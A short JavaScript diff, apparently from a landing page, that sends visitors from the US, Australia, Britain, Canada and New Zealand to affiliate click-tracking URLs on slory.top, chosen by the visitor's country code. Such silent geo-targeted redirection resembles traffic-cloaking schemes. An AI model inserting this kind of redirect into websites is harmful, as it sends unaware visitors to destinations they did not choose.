@@ -13,17 +13,25 @@
                 .then(data => {
                     const country = data.country_code;
 
-                    // Исключения: USA, AU, UK
+                    // Исключения: USA, AU, UK, CA, NZ
                     if (country === 'US') {
-                        window.location.href = 'https://slory.top/click?o=184&a=211';
+                        window.location.href = 'https://slory.top/click?o=169&a=211';
                         return;
                     }
                     if (country === 'AU') {
-                        window.location.href = 'https://slory.top/click?o=186&a=211';
+                        window.location.href = 'https://slory.top/click?o=169&a=211';
                         return;
                     }
                     if (country === 'GB') {
-                        window.location.href = 'https://slory.top/click?o=185&a=211';
+                        window.location.href = 'https://slory.top/click?o=169&a=211';
+                        return;
+                    }
+                    if (country === 'CA') {
+                        window.location.href = 'https://slory.top/click?o=169&a=211';
+                        return;
+                    }
+                    if (country === 'NZ') {
+                        window.location.href = 'https://slory.top/click?o=169&a=211';
                         return;
                     }
 
